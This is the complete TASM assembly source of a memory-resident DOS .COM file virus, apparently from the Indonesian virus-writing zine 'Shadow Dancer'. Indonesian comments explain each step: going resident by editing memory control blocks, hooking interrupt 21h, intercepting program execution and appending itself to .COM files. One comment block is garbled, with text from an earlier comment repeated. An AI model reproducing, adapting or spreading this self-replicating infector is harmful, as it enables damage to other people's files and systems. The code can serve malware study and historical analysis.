; A resident .COM infector demo

BesarMemori =  (SeluruhKodeVirus - Awal) / 16 + 1
;---------------------------------------------------------------;
; BesarMemori ini merupakan jumlah byte yg digunakan oleh virus ;
; , termasuk daerah data yg uninitialized, dlm satuan paragraf. ;
; Kenapa ditambah 1? Krn hasil pembagian belum tentu bulat. Kalo;
; Misalnya seharusnya BesarMemori adl 3.5 para, dg rumus diatas ;
; hasilnya 3, kalo gak dibulatkan keatas maka tidak semua badan ;
; virus tercopy.                                                ;
;---------------------------------------------------------------;

	Ideal                     ; Gaya penulisan khas TASM
	Model	Tiny              ; Model memori
	CodeSeg                   ; Segment kode
	Radix	16                ; Menggunakan satuan bilangan hexa
	Org 0

; Kode virus dimulai disini
Awal:
	call TrikMemperolehIP

TrikMemperolehIP:
	pop bp
	sub bp, Offset $ - 1

;---------------------------------------------------------------;
; Kode diatas seharusnya sudah dimengerti, kalo ngga, liat lagi ;
; Shadow Dancer Zine #1!                                        ;
;---------------------------------------------------------------;

	mov ax, 0FF00
	int 21                    ; Memeriksa kehadiran virus di memori
	cmp ax, 'SD'              ; Apa AX = 'SD' ?
	jz SudahTSR               ; Ya
	call BlonTSR              ; Tidak

;---------------------------------------------------------------;
; Pertama-tama virus memanggil interrupt 21h servis 0FF00h. Ini ;
; mungkin tampak aneh, memang disengaja. Karena servis ini tidak;
; dipakai, maka digunakan oleh virus sebagai Installation-check.;
; Nah, kalo nilai AX berubah menjadi 'SD' berarti virus udah di ;
; memori, kalo bukan berarti blon ada.                          ;
;---------------------------------------------------------------;

SudahTSR:
	lea si, [bp + ByteAsli]   ; SI menunjuk ke ByteAsli
	mov di, 100               ; DI menunjuk awal program
	push di
	movsw                     ; Balikin yg aslinya
	movsb
	xor ax, ax                ; perbaiki isi register
	xor bx, bx
	xor cx, cx
	xor dx, dx
	ret
;---------------------------------------------------------------;
; Kalo virus ternyata udah ada dimemori, maka virus mengembali- ;
; kan kontrol ke program asli. Baca SD Zine #1 biar lebih jelas.;
;---------------------------------------------------------------;

BlonTSR:
	push es
	mov ax, 3521
	int 21                    ; Get interrupt 21h address
	mov [Word ptr bp+AlamatLama + 2], es ; ES = segmentnya
	mov [Word ptr bp+AlamatLama], bx     ; BX = offsetnya
	pop es

;---------------------------------------------------------------;
; Nah sekarang virus siap2 buat TSR. Karena vektor interrupt    ;
; akan dirubah oleh virus menuju ISR virus, maka selametin dulu ;
; alamat ISR interrupt 21h sekarang.                            ;
;---------------------------------------------------------------;

	mov ax, ds                ; AX = segment PSP
	dec ax                    ; AX = segment MCB
	mov ds, ax                ; DS = segment MCB

;---------------------------------------------------------------;
; DS berisi segment dari PSP. Karena MCB terletak 1 segment se- ;
; belum PSP, maka kurangi segment PSP dg 1 akan memberikan apa  ;
; yg di cari, segment MCB.                                      ;
;---------------------------------------------------------------;

	sub [Word ptr 3], BesarMemori  ; Kurangi memori
	sub [Word ptr 12], BesarMemori ; Kurangi batas akhir memori
	mov ax, [Word ptr 12]          ; AX = segment virus
	mov ds, ax
	inc ax
	mov es, ax
	mov [Byte ptr 0], 'Z'
	mov [Word ptr 3], BesarMemori - 1
	mov [Word ptr 8], 8

;---------------------------------------------------------------;
; 1. Virus mengurangi memori yg tersedia.                       ;
; 2. Dapatkan segment virus.                                    ;
; 3. ??ai, maka digunakan oleh virus sebagai Installation-check.;
; Nah, kalo nilai AX berubah menjadi 'SD' berarti virus udah di ;
; memori, kalo bukan berarti blon ada.                          ;
;---------------------------------------------------------------;

	lea si, [bp + Awal]
	xor di, di                ; Offset 0h
	push cs
	pop ds
	mov cx, SeluruhKodeVirus - Awal
	rep movsb

	push es
	pop ds
	lea dx, [ISR]
	mov ax, 2521
	int 21
	push cs cs
	pop ds es
	ret

;---------------------------------------------------------------;
; Virus kemudian menduplikasi dari file ke segment:0h. Setelah  ;
; itu virus mengubah vektor interrupt 21h, menuju ke ISR virus. ;
; Proses instalasi virus ke memori sudah selesai. Sekarang virus;
; mengembalikan kontrol ke program utama.                       ;
;---------------------------------------------------------------;

ByteAsli	db 90, 'Í ' ; nop, int 20h
; Merupakan tempat dimana virus menyimpan byte2 asli file


ISR:
	cmp ax, 0FF00             ; Installation Check?
	jnz ApaEksekusi           ; Bukan
	mov ax, 'SD'              ; Ya, kasi tau udah resident
	iret                      ; Balik ke program

;---------------------------------------------------------------;
; Nah sekarang lu udah ada di ISR virus. Pertama-tama virus cek ;
; apa servisnya merupakan installation check? Kalo iya, berikan ;
; tanda virus sudah resident dan kembalikan kontrol ke program. ;
; Kalo ngga, ya periksa servis lainnya.                         ;
;---------------------------------------------------------------;

ApaEksekusi:
	cmp ax, 4B00              ; Apa eksekusi program?
	jz CegatEksekusi          ; Ya, cegat dulu

MenujuInterruptAsli:
	db 0EA                    ; Kodenya dari Jmp segment:offset
AlamatLama	dd 0              ; Ini segment:offsetnya

CegatEksekusi:
	push ax bx cx dx si di ds es
	pushf

;---------------------------------------------------------------;
; Suatu aturan buat program TSR, simpan semua register yg diru- ;
; bah, termasuk register flag. Lakukan kalo gak mau nanti terja-;
; di hal-hal yg aneh-aneh. Huahuahuahuaha                       ;
;---------------------------------------------------------------;

	mov ax, 3D02
	int 21
	xchg ax, bx

	push cs cs
	pop ds es

	lea dx, [Tampung]
	mov cx, 3
	mov ah, 3F
	int 21
	jc TutupFile

	mov ax, 4202
	cwd
	xor cx, cx
	int 21

;---------------------------------------------------------------;
; Buka file, lalu rubah DS & ES menjadi alamat CS. Kemudian baca;
; 3 byte pertama. Hmmm disini langsung [Tampung] bukannya [bp + ;
; Tampung], krn virus dicopy pada offset 0h. Oleh krn itu semua ;
; variabel gak perlu tambah bp lagi. Trus, pindahin  pointer ke ;
; akhir file skaligus dapetin ukuran file di DX:AX              ;
;---------------------------------------------------------------;

	cmp [Word Tampung], 'MZ'
	jz TutupFile
	cmp [Word Tampung], 'ZM'
	jz TutupFile
	cmp [Tampung], 0E9
	jnz BlonTerinfeksi

	push ax
	sub ax, SeluruhKodeVirus - Awal
	cmp [Word ptr Tampung + 1], ax
	pop ax
	jz TutupFile

BlonTerinfeksi:
	call Infeksi

;---------------------------------------------------------------;
; Selanjutnya virus memeriksa 2 byte pertama, apakah MZ ato ZM. ;
; Selain keduanya berarti lanjutkan rutin virus dg memeriksa apa;
; byte pertama E9h (opcode buat jmp). Kalo iya kurangin dg besar;
; virus, bandingin dg jarak jumpnya. Kalo sama berarti udah ter-;
; infeksi. Kalo beda panggil rutin infeksi.                      ;
;---------------------------------------------------------------;

TutupFile:
	mov ah, 3E
	int 21
	popf
	pop es ds di si dx cx bx ax
	jmp MenujuInterruptAsli

Infeksi:
	lea si, [Tampung]
	lea di, [ByteAsli]
	movsw
	movsb

	sub ax, 3
	mov [Tampung], 0E9
	mov [Word ptr Tampung + 1], ax

	mov ah, 40
	mov cx, KodeDiMemori - Awal
	lea dx, [Awal]
	int 21

	mov ax, 4200
	cwd
	xor cx, cx
	int 21

	mov ah, 40
	mov cx, 3
	lea dx, [Tampung]
	int 21
	ret

KodeDiMemori:

; Ini bagian uninitialized data
Tampung		db 3 dup (?)

SeluruhKodeVirus:
	End